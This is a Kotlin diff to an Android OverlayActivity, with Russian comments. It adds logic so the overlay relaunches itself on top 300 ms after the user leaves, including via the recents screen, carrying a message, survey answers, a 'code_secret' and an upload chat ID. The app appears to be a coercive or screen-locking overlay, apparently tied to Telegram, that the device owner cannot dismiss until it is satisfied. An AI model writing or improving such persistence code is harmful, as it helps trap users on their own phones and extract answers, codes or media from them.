@@ -130,7 +130,30 @@ class OverlayActivity : Activity() {
             finishAndRemoveTask()
             return
         }
-        // plain/reply/survey/code — не закрываем, onUserLeaveHint вернёт поверх
+        if (intentionalLeave) {
+            intentionalLeave = false
+            return
+        }
+        // Перезапускаем — onUserLeaveHint не вызывается при recents
+        handler.postDelayed({
+            if (!done) {
+                val i = Intent(applicationContext, OverlayActivity::class.java).apply {
+                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or
+                            Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
+                    putExtra("message",          originalText)
+                    putExtra("fb_mode",          mode)
+                    putExtra("reply_prompt",     replyPrompt)
+                    putStringArrayListExtra("survey", questions)
+                    putExtra("chat_id",          uploadChatId)
+                    putStringArrayListExtra("answers_progress", answers)
+                    putExtra("current_q",        currentQuestion)
+                    putExtra("code_secret",      codeSecret)
+                    putExtra("allow_media",      allowMedia)
+                    putExtra("allow_feedback",   allowFeedback)
+                }
+                applicationContext.startActivity(i)
+            }
+        }, 300L)
     }
  
     /**
@@ -139,33 +162,8 @@ class OverlayActivity : Activity() {
      */
     override fun onUserLeaveHint() {
         super.onUserLeaveHint()
-        if (done) return
-        if (intentionalLeave) {
-            intentionalLeave = false
-            return  // мы сами открыли VPN/TG — не переоткрываемся
-        }
-        when (mode) {
-            "plain", "reply", "survey", "code" -> {
-                // Немедленно возвращаемся поверх всего
-                handler.postDelayed({
-                    val i = Intent(applicationContext, OverlayActivity::class.java).apply {
-                        flags = Intent.FLAG_ACTIVITY_NEW_TASK or
-                                Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
-                        putExtra("message",      originalText)
-                        putExtra("fb_mode",      mode)
-                        putExtra("reply_prompt", replyPrompt)
-                        putStringArrayListExtra("survey", questions)
-                        putExtra("chat_id",      uploadChatId)
-                        putStringArrayListExtra("answers_progress", answers)
-                        putExtra("current_q",    currentQuestion)
-                        putExtra("code_secret",  codeSecret)
-                        putExtra("allow_media",  allowMedia)
-                        putExtra("allow_feedback", allowFeedback)
-                    }
-                    applicationContext.startActivity(i)
-                }, 300L)
-            }
-        }
+        // onStop тоже запустит перезапуск — ничего не делаем здесь
+        // чтобы избежать двойного запуска
     }
  
     override fun onDestroy() {
